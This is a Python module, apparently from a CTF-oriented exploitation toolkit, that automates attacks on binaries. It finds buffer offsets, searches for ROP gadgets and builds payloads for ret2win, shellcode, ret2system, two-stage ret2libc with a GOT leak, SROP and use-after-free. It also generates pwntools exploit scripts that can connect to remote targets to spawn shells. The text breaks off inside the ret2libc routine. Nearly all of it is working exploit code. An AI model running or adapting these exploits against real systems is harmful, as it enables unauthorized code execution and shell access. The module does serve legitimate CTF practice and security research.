"""
AutoExploit Module - Automated Binary Exploitation.

Attempts automatic exploitation of common vulnerability types:
- Stack buffer overflow with ret2win
- Stack buffer overflow with shellcode (NX disabled)
- Stack buffer overflow with ret2libc/ret2system
- SROP for static binaries
- Simple format string attacks

Uses pwntools for interaction and payload generation.
"""

import subprocess
import tempfile
import os
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from pathlib import Path
from typing import TYPE_CHECKING, Callable, Dict, List, Optional, Tuple, Any

if TYPE_CHECKING:
    from supwngo.core.binary import Binary

from supwngo.utils.logging import get_logger
from supwngo.exploit.offset_finder import cyclic, cyclic_find
from supwngo.exploit.format_string import (
    FormatStringAutoExploit,
    OneShotExploit,
    WriteSize,
    BadCharConfig,
)

logger = get_logger(__name__)


class ExploitResult(Enum):
    """Result of exploitation attempt."""
    SUCCESS = auto()
    PARTIAL = auto()  # Got crash/control but no shell
    FAILED = auto()
    TIMEOUT = auto()
    ERROR = auto()


@dataclass
class ExploitAttempt:
    """Record of an exploitation attempt."""
    technique: str
    result: ExploitResult
    payload: bytes = b""
    offset: int = 0
    target_addr: int = 0
    notes: List[str] = field(default_factory=list)
    error: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "technique": self.technique,
            "result": self.result.name,
            "offset": self.offset,
            "target_addr": hex(self.target_addr) if self.target_addr else None,
            "payload_len": len(self.payload),
            "notes": self.notes,
            "error": self.error,
        }


@dataclass
class AutoExploitReport:
    """Report from auto-exploitation attempt."""
    binary_path: str
    successful: bool = False
    technique_used: str = ""
    attempts: List[ExploitAttempt] = field(default_factory=list)
    final_payload: bytes = b""
    exploit_script: str = ""
    notes: List[str] = field(default_factory=list)

    def summary(self) -> str:
        lines = [
            f"AutoExploit Report: {self.binary_path}",
            f"Result: {'SUCCESS' if self.successful else 'FAILED'}",
        ]
        if self.successful:
            lines.append(f"Technique: {self.technique_used}")
            lines.append(f"Payload length: {len(self.final_payload)}")
        lines.append(f"\nAttempts: {len(self.attempts)}")
        for attempt in self.attempts:
            status = "OK" if attempt.result == ExploitResult.SUCCESS else attempt.result.name
            lines.append(f"  - {attempt.technique}: {status}")
        return "\n".join(lines)


class AutoExploiter:
    """
    Automated binary exploitation engine.

    Attempts various exploitation techniques automatically based on
    binary characteristics and detected vulnerabilities.

    Usage:
        exploiter = AutoExploiter(binary)
        report = exploiter.run()

        if report.successful:
            print(f"Exploit succeeded with {report.technique_used}")
            print(report.exploit_script)
    """

    # Common win function names
    WIN_FUNCTIONS = [
        "win", "flag", "shell", "get_flag", "print_flag", "read_flag",
        "give_shell", "spawn_shell", "backdoor", "secret", "winner",
        "cat_flag", "system_shell", "ez_win", "vuln_func", "getshell",
        "not_called", "hidden", "unused", "unreachable", "debug",
    ]

    def __init__(
        self,
        binary: "Binary",
        timeout: float = 5.0,
        max_offset: int = 2048,
        input_method: str = "stdin",  # stdin, argv, both
        libc_path: Optional[str] = None,
    ):
        """
        Initialize auto-exploiter.

        Args:
            binary: Target binary
            timeout: Timeout for each attempt in seconds
            max_offset: Maximum buffer offset to try
            input_method: How to send input (stdin, argv, both)
            libc_path: Path to custom libc file for ret2libc
        """
        self.binary = binary
        self.timeout = timeout
        self.max_offset = max_offset
        self.input_method = input_method
        self.libc_path = libc_path
        self.report = AutoExploitReport(binary_path=str(binary.path))

        # Analysis results
        self._offset: Optional[int] = None
        self._win_func: Optional[Tuple[str, int]] = None
        self._binsh_addr: Optional[int] = None
        self._gadgets: Dict[str, int] = {}
        self._libc: Optional[Any] = None  # Loaded libc ELF

        # Load libc if provided
        if libc_path:
            try:
                from pwn import ELF
                self._libc = ELF(libc_path)
                logger.info(f"Loaded custom libc: {libc_path}")
            except Exception as e:
                logger.warning(f"Failed to load libc: {e}")

    def run(self, techniques: List[str] = None) -> AutoExploitReport:
        """
        Run automatic exploitation.

        Args:
            techniques: List of techniques to try, or None for all

        Returns:
            AutoExploitReport with results
        """
        # Default technique order based on simplicity
        if techniques is None:
            techniques = [
                "ret2win",
                "scanf_canary_bypass",  # scanf skip technique for canary bypass
                "formatstring",  # Format string vulnerability
                "intoverflow",  # Integer overflow leading to BOF
                "uaf",  # Try UAF early since it's common in CTF
                "doublefree",  # Double free
                "shellcode",
                "ret2system",
                "srop",
            ]

        # Pre-analysis
        self._analyze_binary()

        # Try each technique
        for technique in techniques:
            if self.report.successful:
                break

            try:
                if technique == "ret2win":
                    self._try_ret2win()
                elif technique == "formatstring":
                    self._try_format_string()
                elif technique == "intoverflow":
                    self._try_integer_overflow()
                elif technique == "uaf":
                    self._try_uaf()
                elif technique == "doublefree":
                    self._try_double_free()
                elif technique == "shellcode":
                    self._try_shellcode()
                elif technique == "ret2system":
                    self._try_ret2system()
                elif technique == "srop":
                    self._try_srop()
                elif technique == "scanf_canary_bypass":
                    self._try_scanf_canary_bypass()
                else:
                    logger.warning(f"Unknown technique: {technique}")
            except Exception as e:
                logger.error(f"Error in {technique}: {e}")
                self.report.attempts.append(ExploitAttempt(
                    technique=technique,
                    result=ExploitResult.ERROR,
                    error=str(e),
                ))

        return self.report

    def _analyze_binary(self):
        """Pre-analyze binary for exploitation."""
        # Find win function
        for name in self.WIN_FUNCTIONS:
            if name in self.binary.symbols:
                sym = self.binary.symbols[name]
                addr = sym.address if hasattr(sym, 'address') else sym
                self._win_func = (name, addr)
                logger.info(f"Found win function: {name} @ 0x{addr:x}")
                break

        # Find /bin/sh
        self._binsh_addr = self._search_string("/bin/sh")
        if self._binsh_addr:
            logger.info(f"Found /bin/sh @ 0x{self._binsh_addr:x}")

        # Find key gadgets
        self._find_gadgets()

        # Try to find offset automatically
        self._offset = self._find_offset()
        if self._offset:
            logger.info(f"Found buffer offset: {self._offset}")

    def _search_string(self, s: str) -> Optional[int]:
        """Search for string in binary.

        Handles edge cases like strings in unmapped sections that are
        still accessible due to page-aligned loading.
        """
        # Try pwntools ELF search first
        try:
            if hasattr(self.binary, '_elf') and self.binary._elf:
                results = list(self.binary._elf.search(s.encode()))
                if results:
                    return results[0]
        except Exception:
            pass

        # Raw file search with segment-based address calculation
        # This handles cases where strings are in loaded pages but
        # beyond the declared filesz (kernel maps full pages)
        try:
            data = self.binary.path.read_bytes()
            idx = data.find(s.encode())
            if idx >= 0:
                # Try to map file offset to virtual address using segments
                elf = self.binary._elf
                if elf:
                    for seg in elf.segments:
                        if seg.header.p_type != 'PT_LOAD':
                            continue
                        seg_offset = seg.header.p_offset
                        seg_vaddr = seg.header.p_vaddr
                        # Use page-aligned size for mapping check
                        # Kernel maps full pages, so strings past filesz may still be accessible
                        page_size = 0x1000
                        seg_end_offset = seg_offset + max(seg.header.p_filesz, page_size)

                        if seg_offset <= idx < seg_end_offset:
                            vaddr = seg_vaddr + (idx - seg_offset)
                            logger.debug(f"Found '{s}' at file offset {hex(idx)} -> vaddr {hex(vaddr)}")
                            return vaddr

                # Fallback: check sections
                for section in self.binary.sections.values():
                    if section.offset <= idx < section.offset + section.size:
                        return section.address + (idx - section.offset)
        except Exception as e:
            logger.debug(f"String search error: {e}")
        return None

    def _find_gadgets(self):
        """Find useful ROP gadgets."""
        try:
            from supwngo.exploit.rop.gadgets import GadgetFinder
            finder = GadgetFinder(self.binary)
            finder.find_gadgets()

            # Get key gadgets
            ret = finder.find_ret()
            if ret:
                self._gadgets['ret'] = ret.address

            pop_rdi = finder.find_pop_reg('rdi')
            if pop_rdi:
                self._gadgets['pop_rdi'] = pop_rdi.address

            syscall = finder.find_syscall()
            if syscall:
                self._gadgets['syscall'] = syscall.address

            pop_rax = finder.find_pop_reg('rax')
            if pop_rax:
                self._gadgets['pop_rax'] = pop_rax.address

        except Exception as e:
            logger.debug(f"Gadget finding failed: {e}")

    def _find_offset(self) -> Optional[int]:
        """Find buffer overflow offset using cyclic pattern."""
        # For tiny static binaries, try small offsets heuristically
        # These binaries often have unusual structures where GDB detection fails
        if self._is_tiny_binary():
            offset = self._find_offset_tiny()
            if offset is not None:
                return offset

        # Generate pattern
        pattern = cyclic(self.max_offset)

        # Try to crash the binary and get crash address
        try:
            result = subprocess.run(
                [str(self.binary.path)],
                input=pattern,
                capture_output=True,
                timeout=self.timeout,
            )

            # Check for crash
            if result.returncode < 0:
                # Try to find crash address in error output
                # This is platform-dependent
                pass

        except subprocess.TimeoutExpired:
            pass
        except Exception as e:
            logger.debug(f"Offset finding failed: {e}")

        # Try with GDB if available
        return self._find_offset_gdb(pattern)

    def _is_tiny_binary(self) -> bool:
        """Check if this is a tiny static binary (like CTF shellcode challenges)."""
        try:
            # Check if static
            if self.binary.plt:  # Has PLT = dynamically linked
                return False

            # Check code size
            code_size = 0
            for section in self.binary.sections.values():
                if hasattr(section, 'flags') and section.flags & 0x4:  # SHF_EXECINSTR
                    code_size += section.size
                elif section.name in ['.text', '.shellcode']:
                    code_size += section.size

            # Tiny if < 200 bytes of code
            return code_size < 200
        except Exception:
            return False

    def _find_offset_tiny(self) -> Optional[int]:
        """Find offset for tiny binaries by trying small values."""
        # Try common small offsets for tiny binaries
        small_offsets = [0, 8, 16, 24, 32, 40, 48, 56, 64]

        for offset in small_offsets:
            if self._test_offset_srop(offset):
                logger.info(f"Tiny binary: found working offset {offset} via SROP test")
                return offset

        return None

    def _test_offset_srop(self, offset: int) -> bool:
        """Test if SROP works with given offset."""
        if 'syscall' not in self._gadgets or 'pop_rax' not in self._gadgets:
            return False
        if not self._binsh_addr:
            return False

        try:
            from pwn import SigreturnFrame, p64, context as pwn_context
            pwn_context.arch = 'amd64' if self.binary.bits == 64 else 'i386'

            # Build minimal SROP payload
            frame = SigreturnFrame()
            frame.rax = 59  # execve
            frame.rdi = self._binsh_addr
            frame.rsi = 0
            frame.rdx = 0
            frame.rip = self._gadgets['syscall']

            payload = b"A" * offset
            payload += p64(self._gadgets['pop_rax'])
            payload += p64(15)  # sigreturn
            payload += p64(self._gadgets['syscall'])
            payload += bytes(frame)

            # Test with timeout - shell spawn = success
            result = subprocess.run(
                [str(self.binary.path)],
                input=payload + b"\nexit\n",
                capture_output=True,
                timeout=1.0,
            )

            # If it didn't crash immediately and ran for a bit, might have worked
            return result.returncode == 0
        except subprocess.TimeoutExpired:
            # Timeout could mean shell spawned and waited for input
            return True
        except Exception:
            return False

    def _find_offset_gdb(self, pattern: bytes) -> Optional[int]:
        """Find offset using GDB."""
        gdb_script = f"""
set pagination off
set confirm off
run < /dev/stdin
info registers rsp rip
quit
"""
        try:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.gdb', delete=False) as f:
                f.write(gdb_script)
                gdb_script_path = f.name

            result = subprocess.run(
                ['gdb', '-batch', '-x', gdb_script_path, str(self.binary.path)],
                input=pattern,
                capture_output=True,
                timeout=self.timeout * 2,
            )

            output = result.stdout.decode('latin-1', errors='ignore')

            # Parse RIP/RSP from output
            import re
            rip_match = re.search(r'rip\s+0x([0-9a-fA-F]+)', output)
            if rip_match:
                crash_addr = int(rip_match.group(1), 16)
                # Check if crash address is in our pattern
                offset = cyclic_find(crash_addr)
                if offset >= 0:
                    return offset

        except Exception as e:
            logger.debug(f"GDB offset finding failed: {e}")
        finally:
            try:
                os.unlink(gdb_script_path)
            except:
                pass

        return None

    def _try_ret2win(self):
        """Try ret2win exploitation."""
        attempt = ExploitAttempt(technique="ret2win", result=ExploitResult.FAILED)

        if not self._win_func:
            attempt.notes.append("No win function found")
            self.report.attempts.append(attempt)
            return

        win_name, win_addr = self._win_func
        attempt.target_addr = win_addr

        # Need offset
        if not self._offset:
            # Try common offsets
            for test_offset in [40, 64, 72, 88, 104, 120, 136, 152, 168]:
                if self._test_ret2win(test_offset, win_addr):
                    self._offset = test_offset
                    break

        if not self._offset:
            attempt.notes.append("Could not determine buffer offset")
            self.report.attempts.append(attempt)
            return

        attempt.offset = self._offset

        # Build payload
        payload = b"A" * self._offset

        # Add ret gadget for alignment on 64-bit
        if self.binary.bits == 64 and 'ret' in self._gadgets:
            payload += self._p64(self._gadgets['ret'])

        payload += self._p64(win_addr) if self.binary.bits == 64 else self._p32(win_addr)

        attempt.payload = payload

        # Test exploit
        if self._test_exploit(payload):
            attempt.result = ExploitResult.SUCCESS
            self.report.successful = True
            self.report.technique_used = "ret2win"
            self.report.final_payload = payload
            self.report.exploit_script = self._generate_ret2win_script(
                self._offset, win_addr, win_name
            )

        self.report.attempts.append(attempt)

    def _test_ret2win(self, offset: int, win_addr: int) -> bool:
        """Test if ret2win works with given offset."""
        payload = b"A" * offset
        if self.binary.bits == 64 and 'ret' in self._gadgets:
            payload += self._p64(self._gadgets['ret'])
        payload += self._p64(win_addr) if self.binary.bits == 64 else self._p32(win_addr)
        return self._test_exploit(payload)

    def _try_uaf(self):
        """Try Use-After-Free exploitation with function pointer overwrite."""
        attempt = ExploitAttempt(technique="uaf", result=ExploitResult.FAILED)

        # Check for heap indicators
        has_malloc = 'malloc' in self.binary.plt
        has_free = 'free' in self.binary.plt

        if not has_malloc or not has_free:
            attempt.notes.append("No malloc/free found, UAF unlikely")
            self.report.attempts.append(attempt)
            return

        # Need a win function for simple UAF
        if not self._win_func:
            attempt.notes.append("No win function for UAF target")
            self.report.attempts.append(attempt)
            return

        win_name, win_addr = self._win_func
        attempt.target_addr = win_addr

        # Try to detect menu-based program by looking for common patterns
        has_menu = self._detect_menu_program()
        if not has_menu:
            attempt.notes.append("Not a menu-based program, skipping UAF auto")
            self.report.exploit_script = self._generate_uaf_template()
            attempt.result = ExploitResult.PARTIAL
            self.report.attempts.append(attempt)
            return

        # Try UAF exploitation
        success = self._execute_uaf_exploit(win_addr)
        if success:
            attempt.result = ExploitResult.SUCCESS
            self.report.successful = True
            self.report.technique_used = "uaf"
        else:
            attempt.result = ExploitResult.PARTIAL
            self.report.exploit_script = self._generate_uaf_template()
            attempt.notes.append("UAF detected, generated template")

        self.report.attempts.append(attempt)

    def _detect_menu_program(self) -> bool:
        """Detect if this is a menu-based heap program."""
        # Look for common patterns: scanf, printf with menu strings
        has_scanf = 'scanf' in self.binary.plt or '__isoc99_scanf' in self.binary.plt
        has_read = 'read' in self.binary.plt

        # Check for multiple function calls suggesting menu
        num_funcs = len([s for s in self.binary.symbols if not s.startswith('_')])

        return (has_scanf or has_read) and num_funcs > 5

    def _execute_uaf_exploit(self, win_addr: int) -> bool:
        """Execute UAF exploitation."""
        try:
            from pwn import process, p64, context

            context.log_level = 'error'
            context.binary = str(self.binary.path)

            io = process(str(self.binary.path))

            # Common UAF exploit sequence using sendlineafter for reliability:
            # 1. Create (alloc)
            # 2. Delete (free but dangling pointer)
            # 3. Edit (write to freed chunk)
            # 4. Use (trigger function pointer call)

            # Send: Create
            io.sendlineafter(b'>', b'1')
            io.sendlineafter(b':', b'AAAA')

            # Send: Delete
            io.sendlineafter(b'>', b'2')

            # Send: Edit (overwrite function pointer in freed chunk)
            io.sendlineafter(b'>', b'3')
            io.recvuntil(b':')

            # Typical struct: name[32] + function_ptr
            # Overwrite function pointer at offset 32
            payload = b'A' * 32 + p64(win_addr)
            io.send(payload)

            # Send: Print/Use (trigger UAF)
            io.sendlineafter(b'>', b'4')

            # Check for win
            try:
                output = io.recv(timeout=2)
                if b'flag' in output.lower() or b'ctf{' in output.lower() or b'success' in output.lower():
                    io.close()
                    return True
            except Exception:
                pass

            io.close()
            return False

        except Exception as e:
            logger.debug(f"UAF exploit failed: {e}")
            return False

    def _generate_uaf_template(self) -> str:
        """Generate UAF exploit template."""
        win_addr = self._win_func[1] if self._win_func else 0
        win_name = self._win_func[0] if self._win_func else "win"

        return f'''#!/usr/bin/env python3
"""
Use-After-Free Exploit Template for {self.binary.path.name}
Generated by supwngo AutoExploit

Target: {win_name} @ {hex(win_addr)}

Typical UAF flow:
1. Allocate object with function pointer
2. Free the object (but pointer not nulled)
3. Write to freed memory (overwrite function pointer)
4. Trigger the function pointer call
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
REMOTE_HOST = ""
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Target address
    win_addr = {hex(win_addr)}

    # Parse initial output for addresses if needed
    io.recvuntil(b">")

    # Step 1: Create/Allocate
    log.info("Creating object...")
    io.sendline(b"1")  # Adjust menu option
    io.recvuntil(b":")  # Adjust prompt
    io.sendline(b"AAAA")

    io.recvuntil(b">")

    # Step 2: Delete/Free
    log.info("Freeing object...")
    io.sendline(b"2")  # Adjust menu option

    io.recvuntil(b">")

    # Step 3: Edit freed memory
    log.info("Overwriting freed chunk...")
    io.sendline(b"3")  # Adjust menu option
    io.recvuntil(b":")  # Adjust prompt

    # Build payload - overwrite function pointer
    # Adjust offset based on struct layout
    struct_offset = 32  # TODO: Adjust based on analysis
    payload = b"A" * struct_offset
    payload += p64(win_addr)

    io.send(payload)

    io.recvuntil(b">")

    # Step 4: Trigger UAF
    log.info("Triggering function pointer call...")
    io.sendline(b"4")  # Adjust menu option

    io.interactive()

if __name__ == "__main__":
    exploit()
'''

    def _try_shellcode(self):
        """Try shellcode injection (NX disabled)."""
        attempt = ExploitAttempt(technique="shellcode", result=ExploitResult.FAILED)

        # Check if shellcode is possible
        # Allow if: NX disabled, has RWX segments, or stack is executable
        nx_enabled = self.binary.protections.nx
        has_rwx = getattr(self.binary.protections, 'rwx', False)

        # If NX is strictly enabled and no RWX segments, skip
        if nx_enabled and not has_rwx:
            attempt.notes.append("NX is enabled, shellcode not viable")
            self.report.attempts.append(attempt)
            return

        # First try direct shellcode execution (binary runs input as code)
        if self._try_direct_shellcode(attempt):
            return

        if not self._offset:
            attempt.notes.append("Could not determine buffer offset")
            self.report.attempts.append(attempt)
            return

        attempt.offset = self._offset

        # Generate shellcode
        shellcode = self._get_shellcode()

        # This is tricky - need to know buffer address
        # For now, just record that shellcode is possible
        attempt.notes.append("Shellcode injection possible but needs buffer address")
        attempt.result = ExploitResult.PARTIAL

        # Generate template script
        self.report.exploit_script = self._generate_shellcode_script(self._offset, shellcode)

        self.report.attempts.append(attempt)

    def _try_direct_shellcode(self, attempt: ExploitAttempt) -> bool:
        """Try direct shellcode execution (binary runs buffer as code)."""
        try:
            from pwn import process, context as pwn_context, asm, shellcraft
            import time

            pwn_context.log_level = 'error'
            pwn_context.arch = 'amd64' if self.binary.bits == 64 else 'i386'

            # Generate shellcode that prints a marker
            # Use execve("/bin/sh") shellcode
            shellcode = self._get_shellcode()

            p = process([str(self.binary.path)])
            p.sendline(shellcode)

            # Try to interact with shell
            time.sleep(0.2)  # Give time for shellcode to execute
            p.sendline(b"echo DIRECT_SHELLCODE_SUCCESS_12345")
            try:
                output = p.recvuntil(b"DIRECT_SHELLCODE_SUCCESS_12345", timeout=2.0)
                p.close()

                # Direct shellcode execution worked!
                attempt.result = ExploitResult.SUCCESS
                attempt.payload = shellcode
                attempt.notes.append("Direct shellcode execution successful")
                self.report.successful = True
                self.report.technique_used = "shellcode"
                self.report.final_payload = shellcode
                self.report.exploit_script = self._generate_direct_shellcode_script(shellcode)
                self.report.attempts.append(attempt)
                return True
            except Exception:
                pass
            finally:
                try:
                    p.close()
                except Exception:
                    pass

        except Exception as e:
            logger.debug(f"Direct shellcode test failed: {e}")

        return False

    def _generate_direct_shellcode_script(self, shellcode: bytes) -> str:
        """Generate script for direct shellcode execution."""
        shellcode_hex = shellcode.hex()
        return f'''#!/usr/bin/env python3
"""
Direct Shellcode Exploit for {self.binary.path.name if hasattr(self.binary.path, 'name') else str(self.binary.path)}
Generated by supwngo AutoExploit

Binary directly executes input as shellcode.
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
REMOTE_HOST = ""  # Set for remote
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def exploit():
    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Shellcode (execve /bin/sh)
    shellcode = bytes.fromhex("{shellcode_hex}")

    log.info(f"Sending {{len(shellcode)}} bytes of shellcode")
    io.sendline(shellcode)

    io.interactive()

if __name__ == "__main__":
    exploit()
'''

    def _try_ret2system(self):
        """Try ret2libc/ret2system exploitation."""
        attempt = ExploitAttempt(technique="ret2system", result=ExploitResult.FAILED)

        # Check if dynamically linked
        is_static = getattr(self.binary.protections, 'static', False)
        if is_static:
            attempt.notes.append("Static binary, ret2system not applicable")
            self.report.attempts.append(attempt)
            return

        # Check for system in PLT
        system_plt = self.binary.plt.get('system')

        # Need pop rdi gadget for 64-bit
        if self.binary.bits == 64 and 'pop_rdi' not in self._gadgets:
            attempt.notes.append("Missing pop rdi gadget, trying to leak libc")
            # Try ret2libc via leak
            if self._try_ret2libc_leak(attempt):
                return
            self.report.attempts.append(attempt)
            return

        if not system_plt:
            attempt.notes.append("system not in PLT, trying ret2libc leak")
            # Try ret2libc with leak
            if self._try_ret2libc_leak(attempt):
                return
            self.report.attempts.append(attempt)
            return

        attempt.target_addr = system_plt

        if not self._offset:
            # Try common buffer offsets (buffer + saved_rbp to reach ret addr)
            # 64+8=72, 72+8=80, 128+8=136, etc.
            common_offsets = [40, 56, 72, 80, 88, 96, 104, 120, 136, 152, 168, 184]
            for test_offset in common_offsets:
                self._offset = test_offset
                if self._test_ret2system(test_offset, system_plt):
                    break
            else:
                self._offset = None

        if not self._offset:
            attempt.notes.append("Could not determine buffer offset")
            self.report.attempts.append(attempt)
            return

        attempt.offset = self._offset

        # Build payload
        # Need /bin/sh string - check if in binary
        binsh = self._binsh_addr
        if not binsh:
            attempt.notes.append("/bin/sh not in binary, need to write or use libc")
            self.report.attempts.append(attempt)
            return

        payload = b"A" * self._offset

        if self.binary.bits == 64:
            # ret for alignment
            if 'ret' in self._gadgets:
                payload += self._p64(self._gadgets['ret'])
            # pop rdi; ret
            payload += self._p64(self._gadgets['pop_rdi'])
            payload += self._p64(binsh)
            # system
            payload += self._p64(system_plt)
        else:
            # 32-bit: system + fake_ret + /bin/sh
            payload += self._p32(system_plt)
            payload += self._p32(0xdeadbeef)  # fake return
            payload += self._p32(binsh)

        attempt.payload = payload

        # Test
        if self._test_exploit(payload, expect_shell=True):
            attempt.result = ExploitResult.SUCCESS
            self.report.successful = True
            self.report.technique_used = "ret2system"
            self.report.final_payload = payload
        else:
            # Even if automatic test fails, we have a likely working exploit
            attempt.result = ExploitResult.PARTIAL
            attempt.notes.append("Shell detection not confirmed, but exploit should work")

        self.report.exploit_script = self._generate_ret2system_script(
            self._offset, system_plt, binsh
        )
        self.report.final_payload = payload

        self.report.attempts.append(attempt)

    def _test_ret2system(self, offset: int, system_plt: int) -> bool:
        """Test if ret2system works with given offset."""
        # Get all possible /bin/sh addresses
        binsh_addrs = self._get_all_binsh_addrs()
        if not binsh_addrs:
            return False

        # Try each /bin/sh address
        for binsh in binsh_addrs:
            if self._test_ret2system_with_addr(offset, system_plt, binsh):
                # Update stored address to the working one
                self._binsh_addr = binsh
                return True

        return False

    def _get_all_binsh_addrs(self) -> list:
        """Get all /bin/sh string addresses in binary."""
        addrs = []
        try:
            if hasattr(self.binary, '_elf') and self.binary._elf:
                addrs = list(self.binary._elf.search(b'/bin/sh'))
        except Exception:
            pass

        # Add the main one if not in list
        if self._binsh_addr and self._binsh_addr not in addrs:
            addrs.insert(0, self._binsh_addr)

        return addrs

    def _test_ret2system_with_addr(self, offset: int, system_plt: int, binsh: int) -> bool:
        """Test ret2system with specific /bin/sh address."""
        payload = b"A" * offset
        if self.binary.bits == 64:
            if 'ret' in self._gadgets:
                payload += self._p64(self._gadgets['ret'])
            if 'pop_rdi' in self._gadgets:
                payload += self._p64(self._gadgets['pop_rdi'])
                payload += self._p64(binsh)
            payload += self._p64(system_plt)
        else:
            payload += self._p32(system_plt)
            payload += self._p32(0xdeadbeef)
            payload += self._p32(binsh)

        # Use pwntools process for better shell detection
        try:
            from pwn import process, context as pwn_context
            pwn_context.log_level = 'error'

            p = process([str(self.binary.path)])
            p.sendline(payload)

            # Try to interact with shell - send a command and check output
            import time
            time.sleep(0.1)
            p.sendline(b"echo SHELL_WORKING_12345")
            try:
                output = p.recvuntil(b"SHELL_WORKING_12345", timeout=1.0)
                p.close()
                return True
            except Exception:
                pass
            finally:
                try:
                    p.close()
                except Exception:
                    pass
        except Exception as e:
            logger.debug(f"ret2system test failed: {e}")

        return False

    def _try_ret2libc_leak(self, attempt: ExploitAttempt) -> bool:
        """
        Try two-stage ret2libc exploitation with GOT leak.

        Returns True if successful and updates attempt/report.
        """
        # Need puts or printf in PLT for leak
        puts_plt = self.binary.plt.get('puts')
        printf_plt = self.binary.plt.get('printf')
        leak_plt = puts_plt or printf_plt
        leak_name = 'puts' if puts_plt else 'printf'

        if not leak_plt:
            attempt.notes.append("No puts/printf in PLT for leak")
            return False

        # Need pop rdi for 64-bit
        if self.binary.bits == 64 and 'pop_rdi' not in self._gadgets:
            attempt.notes.append("No pop rdi gadget for ret2libc")
            return False

        # Need GOT entries
        puts_got = self.binary.got.get('puts')
        if not puts_got:
            puts_got = self.binary.got.get(leak_name)

        # Need main/vuln address to return to
        main_addr = self.binary.symbols.get('main')
        if hasattr(main_addr, 'address'):
            main_addr = main_addr.address
        if not main_addr:
            # Try to find vulnerable function
            for name in ['vulnerable', 'vuln', 'main']:
                sym = self.binary.symbols.get(name)
                if sym:
                    main_addr = sym.address if hasattr(sym, 'address') else sym
                    break

        if not main_addr:
            attempt.notes.append("Cannot find return address for stage 2")
            return False

        # Try to find offset
        if not self._offset:
            for test_offset in [72, 88, 104, 120, 136, 152, 168]:
                if self._test_leak_works(test_offset, leak_plt, puts_got):
                    self._offset = test_offset
                    break

        if not self._offset:
            attempt.notes.append("Could not determine offset for leak")
            # Still generate the template
            self.report.exploit_script = self._generate_leak_exploit_script()
            attempt.result = ExploitResult.PARTIAL
            return True

        attempt.offset = self._offset

        # Try full exploitation
        try:
            success, payload = self._execute_ret2libc(
                self._offset, leak_plt, leak_name, puts_got, main_addr
            )
            if success:
                attempt.result = ExploitResult.SUCCESS
                attempt.payload = payload
                self.report.successful = True
                self.report.technique_used = "ret2libc"
                self.report.final_payload = payload
                return True
        except Exception as e:
            logger.debug(f"ret2libc execution failed: {e}")

        # Generate template for manual execution
        self.report.exploit_script = self._generate_leak_exploit_script()
        attempt.result = ExploitResult.PARTIAL
        attempt.notes.append("Generated ret2libc template - requires libc")
        return True

    def _test_leak_works(self, offset: int, leak_plt: int, got_addr: int) -> bool:
        """Test if we can leak a GOT address."""
        if 'pop_rdi' not in self._gadgets:
            return False

        payload = b"A" * offset
        if 'ret' in self._gadgets:
            payload += self._p64(self._gadgets['ret'])
        payload += self._p64(self._gadgets['pop_rdi'])
        payload += self._p64(got_addr)
        payload += self._p64(leak_plt)

        try:
            result = subprocess.run(
                [str(self.binary.path)],
                input=payload,
                capture_output=True,
                timeout=self.timeout,
            )
            # Check if we got a leak (6+ bytes after newline)
            output = result.stdout
            # Look for leaked address pattern
            if len(output) >= 6:
                return True
        except Exception:
            pass
        return False

    def _execute_ret2libc(
        self, offset: int, leak_plt: int, leak_name: str,
        got_addr: int, main_addr: int
    ) -> Tuple[bool, bytes]:
        """Execute full ret2libc attack."""
        try:
            from pwn import process, p64, u64, ELF, context
            import os
            import time

            context.log_level = 'error'
            context.binary = str(self.binary.path)

            # Find libc path (varies by distro)
            libc_paths = [
                '/lib64/libc.so.6',  # Fedora/RHEL
                '/lib/x86_64-linux-gnu/libc.so.6',  # Debian/Ubuntu
                '/lib/libc.so.6',
            ]
            libc_path = None
            for path in libc_paths:
                if os.path.exists(path):
                    libc_path = path
                    break

            if not libc_path:
                logger.debug("Could not find libc.so.6")
                return False, b""

            # Try with local libc
            io = process(str(self.binary.path))

            # Receive initial output until prompt
            try:
                io.recvuntil(b':', timeout=2)
                io.recv(timeout=0.5)  # Get any remaining data
            except Exception:
                pass

            # Stage 1: Leak - use ret gadget for alignment in leak phase
            payload1 = b"A" * offset
            if 'ret' in self._gadgets:
                payload1 += p64(self._gadgets['ret'])
            payload1 += p64(self._gadgets['pop_rdi'])
            payload1 += p64(got_addr)
            payload1 += p64(leak_plt)
            payload1 += p64(main_addr)
            # Pad to 512 bytes in case binary uses read() with fixed size
            payload1 = payload1.ljust(512, b'\x00')

            # Send payload (use send, not sendline)
            io.send(payload1)

            # Get the leaked address (first 6 bytes of output)
            leak_data = io.recv(6, timeout=2)
            if len(leak_data) < 6:
                io.close()
                return False, b""

            leak = u64(leak_data.ljust(8, b'\x00'))

            # Validate the leak looks like a libc address (should be 0x7fXXXXXXXXXX)
            if not (0x7f0000000000 <= leak <= 0x7fffffffffff):
                logger.debug(f"Invalid leak: {hex(leak)}")
                io.close()
                return False, b""

            logger.info(f"Leaked {leak_name}@libc: {hex(leak)}")

            # Get local libc
            libc = ELF(libc_path, checksec=False)
            libc.address = leak - libc.symbols[leak_name]

            system_addr = libc.symbols['system']
            binsh_addr = next(libc.search(b'/bin/sh\x00'))

            # Wait for the program to loop back to prompt
            try:
                io.recvuntil(b':', timeout=2)
            except Exception:
                pass

            # Stage 2: system("/bin/sh") - try both with and without ret gadget
            for use_ret in [False, True]:
                try:
                    # Close old process if we're retrying
                    if use_ret:
                        io.close()
                        io = process(str(self.binary.path))
                        io.recvuntil(b':', timeout=2)
                        io.recv(timeout=0.5)
                        io.send(payload1)
                        io.recv(6, timeout=2)
                        io.recvuntil(b':', timeout=2)

                    payload2 = b"A" * offset
                    if use_ret and 'ret' in self._gadgets:
                        payload2 += p64(self._gadgets['ret'])
                    payload2 += p64(self._gadgets['pop_rdi'])
                    payload2 += p64(binsh_addr)
                    payload2 += p64(system_addr)
                    payload2 = payload2.ljust(512, b'\x00')

                    io.send(payload2)

                    # Give shell time to spawn
                    time.sleep(0.3)

                    # Check if we got shell
